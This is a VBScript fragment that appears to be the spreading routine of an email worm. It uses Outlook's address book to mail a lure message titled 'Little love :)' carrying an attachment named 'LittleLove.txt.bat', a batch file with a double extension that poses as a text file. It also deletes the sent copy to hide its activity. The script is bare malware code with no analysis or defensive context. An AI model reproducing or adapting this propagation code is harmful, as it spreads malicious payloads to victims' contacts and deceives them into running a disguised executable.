   On Error Resume Next
   Set out = Wscript.CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI")
   For lists = 1 to mapi.AddressLists.Count
   Set lists2 = mapi.AddressLists(lists)
   x = 1
   recips = lists2.AddressEntries(x)
   next
   Set email = out.CreateItem(0)
   email.Recipients.Add(recips)
   email.Subject = "Little love :)"
   email.Body = "One kiss, you're the only one for me!"
   email.Attachments.Add "%windir%\LittleLove.txt.bat"
   email.DeleteAfterSubmit = True
   email.Send
